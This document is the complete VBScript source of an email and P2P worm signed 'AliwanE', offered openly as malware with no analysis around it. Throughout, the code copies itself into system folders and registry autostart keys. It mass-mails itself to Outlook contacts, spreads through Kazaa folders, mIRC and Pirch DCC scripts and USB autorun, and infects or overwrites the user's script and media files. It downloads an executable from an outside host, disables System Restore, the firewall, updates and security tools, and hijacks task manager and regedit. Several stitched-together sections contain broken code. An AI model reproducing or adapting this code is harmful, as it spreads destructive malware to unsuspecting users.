' VBS/Worm-IsLaM by AliwanE, 2/10/2009
On Error Resume Next
Set YTDAVDBASYOGAHCE7 = CreateObject("Scripting.FileSystemObject")
Set KZQDXRFLCXGNGIOW8 = CreateObject("WScript.Shell")
Set PUXYKMWCXXVTQBWL9 = YTDAVDBASYOGAHCE7.GetFile(WScript.ScriptFullName)
PUXYKMWCXXVTQBWL9.Copy (YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\Love-You.vbs")
Set ShowWorm = YTDAVDBASYOGAHCE7.GetFile(YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\Love-You.vbs")
ShowWorm.Attributes = 0
PUXYKMWCXXVTQBWL9.Copy (YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\wscript.vbs")
Set HideWorm = YTDAVDBASYOGAHCE7.GetFile(YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\wscript.vbs")
HideWorm.Attributes = 2
KZQDXRFLCXGNGIOW8.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Service", "Wscript.exe " & YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\wscript.vbs %1"
Set DTQBCAMRZLDKBQRU1 = CreateObject("Outlook.Application")
If Not DTQBCAMRZLDKBQRU1 = "" Then
For Each LVIJERUENXMALYGC2 In DTQBCAMRZLDKBQRU1.GetNameSpace("MAPI").AddressLists
For XBUMGFXOXWDHRATT3 = 1 To LVIJERUENXMALYGC2.AddressEntries.Count
OCOKVOSRCWKUHVNA5 = Chr(87) & Chr(83) & Chr(72) & Chr(87) & Chr(67)
TXWFIIKIXXZAQOUP6 = KZQDXRFLCXGNGIOW8.RegRead("HKEY_CURRENT_USER\Software\" & OCOKVOSRCWKUHVNA5 & "\Worm-IsLaM\" & LVIJERUENXMALYGC2.AddressEntries(XBUMGFXOXWDHRATT3))
If TXWFIIKIXXZAQOUP6 <> OCOKVOSRCWKUHVNA5 Then
Set CWCHTAPGSXSNATAI4 = DTQBCAMRZLDKBQRU1.CreateItem(0)
CWCHTAPGSXSNATAI4.Recipients.Add (LVIJERUENXMALYGC2.AddressEntries(XBUMGFXOXWDHRATT3))
CWCHTAPGSXSNATAI4.Subject = "Re: Look at this!"
CWCHTAPGSXSNATAI4.Body = "Hello, see this site [ http://h1.ripway.com/spider88/index.html ] and download these attachments!"
CWCHTAPGSXSNATAI4.Attachments.Add (YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\Love-You.vbs")
CWCHTAPGSXSNATAI4.DeleteAfterSubmit = True
CWCHTAPGSXSNATAI4.Importance = 1
CWCHTAPGSXSNATAI4.Send
KZQDXRFLCXGNGIOW8.RegWrite "HKEY_CURRENT_USER\Software\" & OCOKVOSRCWKUHVNA5 & "\Worm-IsLaM\" & LVIJERUENXMALYGC2.AddressEntries(XBUMGFXOXWDHRATT3), OCOKVOSRCWKUHVNA5
End If
Next
Next
End If
BAKBMAANIWNBWDJD10 = KZQDXRFLCXGNGIOW8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
For SwitchFolders = 0 To 9
FolderArray = Array("C:\Kazaa\My Shared Folder", _
BAKBMAANIWNBWDJD10 & "\KaZaA Lite\My Shared Folder", _
"C:\My Downloads", _
BAKBMAANIWNBWDJD10 & "\Kazaa\My Shared Folder", _
BAKBMAANIWNBWDJD10 & "\KaZaA Lite\My Shared Folder", _
BAKBMAANIWNBWDJD10 & "\Bearshare\Shared", _
BAKBMAANIWNBWDJD10 & "\Edonkey2000", _
BAKBMAANIWNBWDJD10 & "\Morpheus\My Shared Folder", _
BAKBMAANIWNBWDJD10 & "\Grokster\My Grokster", _
BAKBMAANIWNBWDJD10 & "\ICQ\Shared Files")
If YTDAVDBASYOGAHCE7.FolderExists(FolderArray(SwitchFolders)) Then
PUXYKMWCXXVTQBWL9.Copy (FolderArray(SwitchFolders) & "\Hotmail_Passwords.vbs")
Set ShowP2PFile = YTDAVDBASYOGAHCE7.GetFile(FolderArray(SwitchFolders) & "\Hotmail_Passwords.vbs")
ShowP2PFile.Attributes = 0
End If
Next
PUXYKMWCXXVTQBWL9.Copy (YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\CheckThis.vbs")
Set ShowMircCopy = YTDAVDBASYOGAHCE7.GetFile(YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\CheckThis.vbs")
ShowMircCopy.Attributes = 0
BAKBMAANIWNBWDJD10 = KZQDXRFLCXGNGIOW8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If YTDAVDBASYOGAHCE7.FileExists("C:\Mirc\Mirc.ini") Then
mIRCPath = "C:\Mirc"
Else
If YTDAVDBASYOGAHCE7.FileExists("C:\Mirc32\Mirc.ini") Then
mIRCPath = "C:\Mirc32"
Else
If YTDAVDBASYOGAHCE7.FileExists(BAKBMAANIWNBWDJD10 & "\Mirc\Mirc.ini") Then
mIRCPath = BAKBMAANIWNBWDJD10 & "\Mirc"
End If
End If
End If
If Not mIRCPath = "" Then
Set WriteMirc = YTDAVDBASYOGAHCE7.CreateTextFile(mIRCPath & "\Script.ini", True)
WriteMirc.WriteLine ("[script]")
WriteMirc.WriteLine ("n5= on 1:JOIN:#:{")
WriteMirc.WriteLine ("n6= /if ( $nick == $me ) { halt }")
WriteMirc.WriteLine ("n7= /msg $nick Check This file necessary :)")
WriteMirc.WriteLine ("n8= /dcc send -c $nick " & YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\CheckThis.vbs")
WriteMirc.WriteLine ("n9= }")
WriteMirc.Close
Set HideScript = YTDAVDBASYOGAHCE7.GetFile(mIRCPath & "\Script.ini")
HideScript.Attributes = 2
End If
PUXYKMWCXXVTQBWL9.Copy (YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\humour.vbs")
Set ShowPirchCopy = YTDAVDBASYOGAHCE7.GetFile(YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\humour.vbs")
ShowPirchCopy.Attributes = 0
If YTDAVDBASYOGAHCE7.FolderExists("C:\Pirch") Then
PirchPath = "C:\Pirch"
Else
If YTDAVDBASYOGAHCE7.FolderExists("C:\Pirch32") Then
PirchPath = "C:\Pirch32"
Else
BAKBMAANIWNBWDJD10 = KZQDXRFLCXGNGIOW8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If YTDAVDBASYOGAHCE7.FolderExists(BAKBMAANIWNBWDJD10 & "\Pirch") Then
PirchPath = BAKBMAANIWNBWDJD10 & "\Pirch"
End If
End If
End If
If Not PirchPath = "" Then
Set WritePirch = YTDAVDBASYOGAHCE7.CreateTextFile(Path & "\Events.ini", True)
WritePirch.WriteLine ("[Levels]")
WritePirch.WriteLine ("Enabled=1")
WritePirch.WriteLine ("Count=6")
WritePirch.WriteLine ("Level1=000-Unknowns")
WritePirch.WriteLine ("000-UnknownsEnabled=1")
WritePirch.WriteLine ("Level2=100-Level 100")
WritePirch.WriteLine ("100-Level 100Enabled=1")
WritePirch.WriteLine ("Level3=200-Level 200")
WritePirch.WriteLine ("200-Level 200Enabled=1")
WritePirch.WriteLine ("Level4=300-Level 300")
WritePirch.WriteLine ("300-Level 300Enabled=1")
WritePirch.WriteLine ("Level5=400-Level 400")
WritePirch.WriteLine ("400-Level 400Enabled=1")
WritePirch.WriteLine ("Level6=500-Level 500")
WritePirch.WriteLine ("500-Level 500Enabled=1")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[000-Unknowns]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("Event1=ON JOIN:#:/msg $nick This is best funny!")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[100-Level 100]")
WritePirch.WriteLine ("User1=*!*@*")
WritePirch.WriteLine ("UserCount=1")
WritePirch.WriteLine ("Event1=ON JOIN:#:/dcc send $nick " & YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & "\humour.vbs")
WritePirch.WriteLine ("EventCount=1")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[200-Level 200]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[300-Level 300]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[400-Level 400]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[500-Level 500]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.Close
Set HideScript2 = YTDAVDBASYOGAHCE7.GetFile(PirchPath & "\Events.ini")
HideScript2.Attributes = 2
End If
E1()
Sub E1()
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
For Each SeekNetCopyDrives In a.Drives
If SeekNetCopyDrives.DriveType = 2 _
Or SeekNetCopyDrives.DriveType = 3 Then
E3 (SeekNetCopyDrives.Path & "\")
End If
Next
End Sub
Sub E2(FileTarget)
On Error Resume Next
Set otf = a.GetFile(WScript.ScriptFullName)
ra = otf.ReadAll
otf.Close
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.Files
FileExt = LCase(a.GetExtensionName(n.Path))
If FileExt = "vbs" Or FileExt = "vbe" Then
Set openvbs = a.OpenTextFile(n.Path, 1)
vbsra = openvbs.ReadAll
openvbs.Close
If InStr(1, vbsra, "Worm-IsLaM") = False Then
Set YTDAVDBASYOGAHCE7 = CreateObject("Scripting.FileSystemObject")
Set JC = YTDAVDBASYOGAHCE7.OpenTextFile(WScript.ScriptFullName, 1)
WormFileReadAllText = JC.ReadAll
JC.Close
Set WriteWormCode = YTDAVDBASYOGAHCE7.OpenTextFile(n.Path, 8, True)
WriteWormCode.WriteLine vbCrLf & "' Worm-IsLaM" & vbCrLf & "Tz = " & Chr(34) & Chr(34)
For i = 1 To Len(WormFileReadAllText)
Tz = Mid(WormFileReadAllText, i, 1)
Tz = Hex(Asc(Tz))
If Len(Tz) = 1 Then
Tz = "0" & Tz
End If
Gz = Gz + Tz
If Len(Gz) = 110 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
If Len(WormFileReadAllText) - i = 0 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
Next
WriteWormCode.WriteLine "Set YTDAVDBASYOGAHCE7 = CreateObject(""Scripting.FileSystemObject"")"
WriteWormCode.WriteLine "Set KZQDXRFLCXGNGIOW8 = CreateObject(""WScript.Shell"")"
WriteWormCode.WriteLine "Set WriteAppend = YTDAVDBASYOGAHCE7.CreateTextFile(YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & ""\wscript.vbs"", True)"
WriteWormCode.WriteLine "WriteAppend.Write CM(Tz)"
WriteWormCode.WriteLine "WriteAppend.Close"
WriteWormCode.WriteLine "KZQDXRFLCXGNGIOW8.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Service"", ""Wscript.exe "" & YTDAVDBASYOGAHCE7.GetSpecialFolder(1) & ""\wscript.vbs %1"""
WriteWormCode.WriteLine "Function CM(CN)"
WriteWormCode.WriteLine "For GC = 1 To Len(CN) Step 2"
WriteWormCode.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
WriteWormCode.WriteLine "Next"
WriteWormCode.WriteLine "End Function"
WriteWormCode.Close
End If
End If
If FileExt = "jpg" Or FileExt = "html" Or FileExt = "mpg" Then
YTDAVDBASYOGAHCE7.CopyFile WScript.ScriptFullName, n.Path & ".vbs"
YTDAVDBASYOGAHCE7.DeleteFile (n.Path)
End If
Next
End Sub
Sub E3(FileTarget)
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.SubFolders
E2 (n.Path)
E3 (n.Path)
Next
End Sub
on error resume next
dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,check,sd
'==============================AliwanE==============================
atr = "[autorun]"&vbcrlf&"shellexecute=Wscript.exe /e:vbs pic.jpg"
'==============================AliwanE==============================
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
set reg=createobject("WScript.Shell")
dim text,size
size = mf.size
check = mf.drive.drivetype
set text=mf.openastextstream(1,-2)
do while not text.atendofstream
mysource=mysource&text.readline
mysource=mysource & vbcrlf
loop
Set winpath = fs.getspecialfolder(0)
set tf = fs.getfile(winpath&"\system32\windows.exe") : tf.attributes=32
'===========================================AliwanE========================================
HTTPDownload "http://h1.ripway.com/spider88/ayhaga.exe" ,"C:\"   
Sub HTTPDownload( myURL, myPath )  
Dim i, objFile, objFSO, objHTTP, strFile, strMsg  
Const ForReading = 1, ForWriting = 2, ForAppending = 8  
Set objFSO = CreateObject( "Scripting.FileSystemObject" )  
If objFSO.FolderExists( myPath ) Then  
strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )  
ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then  
strFile = myPath  
Else  
Exit Sub  
End If  
Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )  
Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )  
objHTTP.Open "GET", myURL, False  
objHTTP.Send  
For i = 1 To LenB( objHTTP.ResponseBody )  
objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )  
Next  
objFile.Close( )  
End Sub  
'===========================================AliwanE========================================
resultat = reg.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mp3file\DefaultIcon\")
reg.Regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Vbsfile\DefaultIcon\",resultat
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\LimitSystemRestoreCheckpointing","1","REG_DWORD"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR","1","REG_DWORD"
reg.regwrite "HKEY_CLASSES_ROOT\VBSFile\FriendlyTypeName", "MP3 Audio", "REG_SZ"
reg.regwrite "HKEY_CLASSES_ROOT\mp3file\FriendlyTypeName", "Good Songs", "REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SYSTEMCurrentControlSet\Services\SharedAccess\Start",4,"REG_DWORD"
reg.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv\Start",4,"REG_DWORD"
reg.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wscsvc\Start",4,"REG_DWORD"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\AntiVirusOverride",1,"REG_DWORD"
reg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\DisplayLogo",0,"REG_DWORD"
reg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"REG_DWORD"
reg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\DisplayLogo",0,"REG_DWORD"
reg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
reg.regwrite "HKEY_CLASSES_ROOT\exefile\shell\Scan for virus,s\command\",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
reg.regwrite "HKEY_CLASSES_ROOT\exefile\shell\Open application\command\",winpath&"\system32\win.exe" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\drwtsn32.exe\Debugger",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\Debugger",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rstrui.exe\Debugger",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwwin.exe\Debugger",winpath&"\system32\win.exe" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSConfig.exe\Debugger",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
reg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe\Debugger",win&"\win.exe" ,"REG_SZ"
'===========================================AliwanE========================================
Set winpath = fs.getspecialfolder(0)
set tf = fs.getfile(winpath & "\system32\windowspic.jpg")
tf.attributes = 32
set tf=fs.createtextfile(winpath & "\system32\windowspic.jpg",2,true)
tf.write mysource
tf.close
set tf = fs.getfile(winpath & "\system32\windowspic.jpg")
tf.attributes = 39
'===========================================AliwanE========================================
do
for each flashdrive in fs.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then
set tf=fs.getfile(flashdrive.path &"\pic.jpg")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\pic.jpg",2,true)
tf.write mysource
tf.close
set tf=fs.getfile(flashdrive.path &"\pic.jpg")
tf.attributes = 39
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write atr
tf.close
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 39
end if
'===========================================AliwanE========================================
next
set rg = createobject("WScript.Shell")
rg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\regdiit",winpath&"\system32\win.exe"
rg.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Script Host\Settings\Enabled",1,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun",0,"REG_DWORD"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","   .-~= Hacked by MusliM {Tormentor} =~-.  "
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://h1.ripway.com/spider88/victiml.html"
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\CTFMON",winpath&"\system32\wscript.exe /E:vbs "&winpath&"\system32\windowspic.jpg" ,"REG_SZ"
rg.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot"
rg.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL"
if check <> 1 then
Wscript.sleep 5000
end if
loop while check<>1
set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
'===========================================AliwanE========================================
Set K3FS5I35 = createobject("scripting.filesystemobject")
RTM3SKOO = K3FS5I35.getspecialfolder(1)
E1HG68PJ = RTM3SKOO & "\Vbswg_Worm.vbs"
Set MA5A04H8 = createobject("wscript.shell")
MA5A04H8.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Ru n\WinUpdate", "wscript.exe " & E1HG68PJ & " %"
K3FS5I35.copyfile wscript.scriptfullname, E1HG68PJ
E9U647HC
If MA5A04H8.regread("HKLM\SOFTWARE\Microsoft\Windows\ CurrentVersion\Vbswg _Tiger_\NQQ73HJ2") <> 1 then
DOH10DBI
End if
If MA5A04H8.regread("HKLM\SOFTWARE\Microsoft\Windows\ CurrentVersion\Vbswg _Insane_\OVJ37SDF") <> 1 then
ELHBOB13 ""
End if
GF130JDO
Set V9KTF11Q= K3FS5I35.opentextfile(wscript.scriptfullname)
G5340MK6 = V9KTF11Q.readall
V9KTF11Q.close
Do
if not(K3FS5I35.fileexists(wscript.scriptfullname)) then
set IC827855= K3FS5I35.createtextfile(wscript.scriptfullname)
IC827855.write G5340MK6
IC827855.close
end if
VFK74CDH = MA5A04H8.regread("HKLM\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run\WinUpdate")
If VFK74CDH <> "wscript.exe " & E1HG68PJ & " %" then
MA5A04H8.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Ru n\WinUpdate", "wscript.exe " & E1HG68PJ & " %"
end if
VFK74CDH= ""
loop
Function DOH10DBI()
Set BF3V141D = CreateObject("Outlook.Application")
If BF3V141D = "Outlook" Then
Set P6D291ST = BF3V141D.GetNameSpace("MAPI")
Set S48S8H3H = P6D291ST.AddressLists
For Each QOT7C72P In S48S8H3H
If QOT7C72P.AddressEntries.Count <> 0 Then
D057B2O0 = QOT7C72P.AddressEntries.Count
For CMUI91F7 = 1 To D057B2O0
Set LM8F50BD = BF3V141D.CreateItem(0)
Set L1GGM4O2 = QOT7C72P.AddressEntries(CMUI91F7)
LM8F50BD.To = L1GGM4O2.Address
LM8F50BD.Subject = "Meget vigtigt "
LM8F50BD.Body = "TJeck den her fil please " & vbcrlf & "det er en sikkerheds updating fra din " & vbcrlf & "internet udbydder." & vbcrlf & ""
execute "set FKB534Q9 =LM8F50BD." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
LOV3FS5I = E1HG68PJ
LM8F50BD.DeleteAfterSubmit = True
FKB534Q9.Add LOV3FS5I
If LM8F50BD.To <> "" Then
LM8F50BD.Send
End If
Next
End If
Next
End If
End function
Function ELHBOB13(VPR0MML5)
If VPR0MML5 <> "" Then
M07A5A04 = MA5A04H8.regread("HKEY_LOCAL_MACHINE\Software\Micr osoft\Windows\CurrentVersion\ProgramFilesDir")
If K3FS5I35.fileexists("c:\mirc\mirc.ini") Then
VPR0MML5 = "c:\mirc"
ElseIf K3FS5I35.fileexists("c:\mirc32\mirc.ini") Then
VPR0MML5 = "c:\mirc32"
ElseIf K3FS5I35.fileexists(M07A5A04 & "\mirc\mirc.ini") Then
VPR0MML5 = M07A5A04 & "\mirc"
ElseIf K3FS5I35.fileexists(M07A5A04 & "\mirc32\mirc.ini") Then
VPR0MML5 = M07A5A04 & "\mirc"
Else
VPR0MML5 = ""
End If
End If
If VPR0MML5 <> "" Then
Set H65TM3SK = K3FS5I35.CreateTextFile(VPR0MML5 & "\script.ini", True)
H65TM3SK = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
H65TM3SK = H65TM3SK & vbCrLf & "n0=on 1:JOIN:#:{"
H65TM3SK = H65TM3SK & vbCrLf & "n1= /if ( $nick == $me ) { halt }"
H65TM3SK = H65TM3SK & vbCrLf & "n2= /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
H65TM3SK = H65TM3SK & E1HG68PJ
H65TM3SK = H65TM3SK & vbCrLf & "n3=}"
script.Close
End If
End Function
Function O6Q1HG68()
On Error Resume Next
Set PBT9U647 = K3FS5I35.Drives
For Each T6OG14A0 In PBT9U647
V4017BK9 = T6OG14A0 & " \ "
Call N1B16LQ6(V4017BK9)
Next
End Function
Function N1B16LQ6(P8565492)
O63B3J8V = P8565492
Set BF2GUJ6C = K3FS5I35.GetFolder(O63B3J8V)
Set A27OBUDD = BF2GUJ6C.Files
For Each J1592HU3 In A27OBUDD
If lcase(J1592HU3.Name) = "mirc.ini" Then
ELHBOB13(J1592HU3.ParentFolder)
End If
If K3FS5I35.GetExtensionName(J1592HU3.path) = "vbs" then
K3FS5I35.CopyFile wscript.scriptfullname,J1592HU3.path,true
End if
If K3FS5I35.GetExtensionName(J1592HU3.path) = "vbe" then
K3FS5I35.CopyFile wscript.scriptfullname,J1592HU3.path,true
End if
Next
Set P936K3MH = BF2GUJ6C.Subfolders
For Each C5VH9MOM In P936K3MH
Call (C5VH9MOM.path)
Next
End function
Function E9U647HC()
Randomize
If 1 + Int(Rnd * 50) = 7 then
MA5A04H8.run "RUNDLL32.EXE user.exe,exitwindows"
end if
end function
Dim x
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Sexy GIrls"
Mail.Body="look"
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
Next
ol.Quit
' The End [ AliwanE ]
